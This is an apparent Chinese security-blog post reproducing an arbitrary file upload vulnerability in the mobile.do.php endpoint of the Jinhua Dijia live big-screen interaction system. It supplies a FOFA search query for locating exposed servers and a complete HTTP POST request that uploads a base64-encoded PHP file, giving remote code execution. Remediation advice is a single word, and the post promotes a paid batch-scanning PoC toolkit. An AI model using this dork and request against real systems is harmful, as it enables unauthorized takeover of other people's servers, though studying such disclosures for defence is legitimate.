#  金华迪加现场大屏互动系统mobile.do.php接口存在任意文件上传漏洞 附POC   
2024-11-4更新  南风漏洞复现文库   2024-11-04 21:40  
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 1. 金华迪加现场大屏互动系统简介  
  
微信公众号搜索：南风漏洞复现文库 该文章 南风漏洞复现文库 公众号首发  
  
金华迪加现场大屏互动系统  
## 2.漏洞描述  
  
金华迪加现场大屏互动系统mobile.do.php接口存在任意文件上传漏洞  
  
CVE编号:  
  
CNNVD编号:  
  
CNVD编号:  
## 3.影响版本  
  
金华迪加现场大屏互动系统  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsJDm7fvc3YvePKKDVaIyMXTmy6Adyq1kYSicM3VcAmdJstB4jw1IZ4Lr7NjiazSrtHueWd2wnh7plBGuSp7d5EQ/640?wx_fmt=png&from=appmsg "null")  
  
金华迪加现场大屏互动系统mobile.do.php接口存在任意文件上传漏洞  
## 4.fofa查询语句  
  
body="/wall/themes/meepo/assets/images/defaultbg.jpg" || title="现场活动大屏幕系统"  
## 5.漏洞复现  
  
漏洞链接：https://xx.xx.xx.xx/mobile/mobile.do.php?action=msg_uploadimg  
  
漏洞数据包：  
```
POST /mobile/mobile.do.php?action=msg_uploadimg HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Host: xx.x.xx.xxx
Content-Length: 71
Content-Type: application/x-www-form-urlencoded

filetype=php&imgbase64=PD9waHAgcGhwaW5mbygpO3VubGluayhfX0ZJTEVfXyk7Pz4=
```  
  
会返回上传文件地址，其中PD9waHAgcGhwaW5mbygpO3VubGluayhfX0ZJTEVfXyk7Pz4= 是 的base64编码  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YvePKKDVaIyMXTmy6Adyq1gMflWxkkV0Xs90q64OPibkiagSvETrP1zicXZ0vD5zicd2PsHToYkMOMPQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
https://xxx.x.xx.xx/data/pic/pic_173072510494711.php  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YvePKKDVaIyMXTmy6Adyq177Jtglov0GPI0ibibsLV0aib4JC2pJmO4OMJBKvhiaOnmJX0rNiaw7l901g/640?wx_fmt=jpeg&from=appmsg "null")  
## 6.POC&EXP  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全1: 更新poc批量扫描软件，承诺，一周更新8-14个插件吧，我会优先写使用量比较大程序漏洞。2: 免登录，免费fofa查询。3: 更新其他实用网络安全工具项目。4: 免费指纹识别，持续更新指纹库。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YvePKKDVaIyMXTmy6Adyq1q15BcrmmoDBrDQpsrgMX0Fjs6icqiaxISmfvsYI3xrbnxxUuyo4uTyvQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YvePKKDVaIyMXTmy6Adyq1XZGOYdyordbHaWAnMKoU6Gxg2lpJRMWcJTyx85L7mrSE4VEqk9dBVw/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YvePKKDVaIyMXTmy6Adyq1wctfJsy8swpIzlPbPkkTv213ZzGRVvQScJgDyhpZoOe1FgtefjpJcA/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YvePKKDVaIyMXTmy6Adyq1Q2Szj2Ip4ib6LtD0yIOyoPcND2NxvXFbboLrqkDTz6Wxy6bNhFiaH9Kw/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YvePKKDVaIyMXTmy6Adyq17M4GRDmdL8qFPmJbKG8dHd6JLvUhjUic2khibrylu3C6IbH5Wfrf0aVQ/640?wx_fmt=jpeg&from=appmsg "null")  
## 7.整改意见  
  
打补丁  
## 8.往期回顾  
  
  
[明源云ERP报表服务GetErpConfig.aspx接口存在敏感信息泄露漏洞 附POC](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247487624&idx=1&sn=33135f963826604ee69c3fa856c5c052&chksm=974b9d8fa03c14999e4ffe2b8ebb480471d29c278166864c0d58b06595586ef862c67c8d3182&scene=21#wechat_redirect)  
  
  
[officeWeb365 PW/SaveDraw接口存在任意文件上传漏洞 -老漏洞](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247487612&idx=1&sn=7eab6f76a8eefdfae301fbce1d4b8484&chksm=974b9d7ba03c146da28d4bad3e7de866b717612911e05fa549cef911510b6dba50d9f157f0ad&scene=21#wechat_redirect)  
  
  
